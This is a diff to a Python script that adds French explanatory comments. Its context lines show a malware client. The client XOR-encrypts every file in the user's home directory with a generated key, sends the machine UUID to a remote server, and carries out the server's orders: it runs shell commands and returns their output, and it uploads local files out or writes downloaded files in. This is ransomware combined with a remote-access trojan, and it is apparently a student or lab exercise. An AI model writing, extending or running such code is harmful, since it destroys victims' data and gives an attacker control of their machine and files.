@@ -7,6 +7,7 @@ import sys
 BUF_SIZE = 4096
 
 
+# Recuperation de l'UUID de la machine
 def get_uuid():
     path = "/proc/sys/kernel/random/uuid"
     try:
@@ -17,6 +18,7 @@ def get_uuid():
         return subprocess.getoutput("cat /proc/sys/kernel/random/uuid") or "unknown"
 
 
+# Generation d'une cle de 16 caracteres pour le chiffrement
 def generate_key(length=16):
     letters = []
     try:
@@ -36,11 +38,13 @@ def generate_key(length=16):
     return "".join(letters)[:length]
 
 
+# XOR simple et reversible avec la cle
 def xor_bytes(data, key_bytes):
     klen = len(key_bytes)
     return bytes(b ^ key_bytes[i % klen] for i, b in enumerate(data))
 
 
+# Parcours du home et XOR sur chaque fichier
 def protect_home(key):
     home_dir = os.path.expanduser("~")
     key_bytes = key.encode()
@@ -58,11 +62,13 @@ def protect_home(key):
                 continue
 
 
+# Envoi d'une ligne texte au serveur
 def send_line(fobj, text):
     fobj.write((text + "\n").encode())
     fobj.flush()
 
 
+# Execution d'une commande et envoi de la sortie en base64
 def handle_exec(cmd):
     try:
         output = subprocess.getoutput(cmd)
@@ -72,6 +78,7 @@ def handle_exec(cmd):
         return f"ERROR exec {exc}"
 
 
+# Envoi d'un fichier au serveur en base64
 def handle_upload(path):
     try:
         with open(path, "rb") as f:
@@ -82,6 +89,7 @@ def handle_upload(path):
         return f"ERROR upload {path} {exc}"
 
 
+# Reception d'un fichier en base64 puis ecriture
 def handle_download(dest, b64_data):
     try:
         data = base64.b64decode(b64_data)
@@ -95,6 +103,7 @@ def handle_download(dest, b64_data):
         return f"ERROR download {dest} {exc}"
 
 
+# Boucle principale du client (connexion + ordres)
 def client_loop(host, port):
     key = generate_key()
     uuid = get_uuid()
@@ -130,7 +139,7 @@ def client_loop(host, port):
             else:
                 send_line(fobj, "ERROR download bad_args")
             continue
-        # Commande inconnue
+        # Commande non prevue -> on renvoie une erreur simple
         send_line(fobj, "ERROR unknown_command")
     sock.close()
 
